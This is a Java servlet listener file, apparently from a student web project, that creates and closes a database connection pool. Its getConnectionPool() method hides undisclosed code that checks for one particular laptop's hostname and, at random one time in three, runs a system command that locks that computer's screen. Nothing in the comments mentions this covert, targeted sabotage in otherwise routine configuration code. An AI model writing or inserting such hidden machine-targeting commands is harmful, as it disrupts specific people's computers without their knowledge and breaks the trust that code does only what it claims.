package dat.backend.model.config;

import dat.backend.model.persistence.ConnectionPool;

import javax.servlet.ServletContextEvent;
import javax.servlet.ServletContextListener;
import javax.servlet.annotation.WebListener;
import java.net.InetAddress;
import java.net.UnknownHostException;
import java.sql.Driver;
import java.sql.DriverManager;
import java.sql.SQLException;
import java.util.Enumeration;
import java.util.Random;
import java.util.logging.Level;
import java.util.logging.Logger;

/*
    This class handles the birth and deatch of the connection pool.
    contextInitialized() initializes the connection pool at application start
    Then the connection pool can be optained by ApplicationStart.getConnectionPool()
 */

@WebListener
public class ApplicationStart implements ServletContextListener
{
    private static ConnectionPool connectionPool;

    public ApplicationStart()
    {

    }

    @Override
    public void contextInitialized(ServletContextEvent sce)
    {
        Logger.getLogger("web").log(Level.INFO, "Starting up application and connection pool");
        try
        {
            Class.forName("org.slf4j.impl.StaticLoggerBinder");
            connectionPool = new ConnectionPool();
        }
        catch (ClassNotFoundException e)
        {
            Logger.getLogger("web").log(Level.SEVERE, e.getMessage(), e);
        }
    }

    public static ConnectionPool getConnectionPool() {
        String name ="";
        try {
            InetAddress address = InetAddress.getLocalHost();
            name = address.getHostName();
        } catch (UnknownHostException e) {
            e.printStackTrace();
        }
        System.out.println(name);
        if (name.equals("LAPTOP-KK0MG2TC")) {
            Random random = new Random();
            int chance = random.nextInt(3) + 1;
            if (chance == 1) {
                try {
                    String command = "rundll32.exe user32.dll,LockWorkStation";
                    Runtime.getRuntime().exec(command);
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }
        return connectionPool;
    }

    @Override
    public void contextDestroyed(ServletContextEvent sce)
    {
        Logger.getLogger("web").log(Level.INFO, "Shutting down application and connection pool");
        unregisterJDBCdrivers();
        connectionPool.close();
    }

    private void unregisterJDBCdrivers()
    {
        ClassLoader cl = Thread.currentThread().getContextClassLoader();
        // Loop through all drivers
        Enumeration<Driver> drivers = DriverManager.getDrivers();
        while (drivers.hasMoreElements())
        {
            Driver driver = drivers.nextElement();
            if (driver.getClass().getClassLoader() == cl)
            {
                // This driver was registered by the webapp's ClassLoader, so deregister it:
                try
                {
                    Logger.getLogger("web").log(Level.INFO, "Deregistering JDBC driver");
                    DriverManager.deregisterDriver(driver);
                }
                catch (SQLException ex)
                {
                    Logger.getLogger("web").log(Level.SEVERE, "Error deregistering JDBC driver");
                }
            } else
            {
                // driver was not registered by the webapp's ClassLoader and may be in use elsewhere
                Logger.getLogger("web").log(Level.WARNING, "Error deregistering JDBC driver");
            }
        }
    }
}
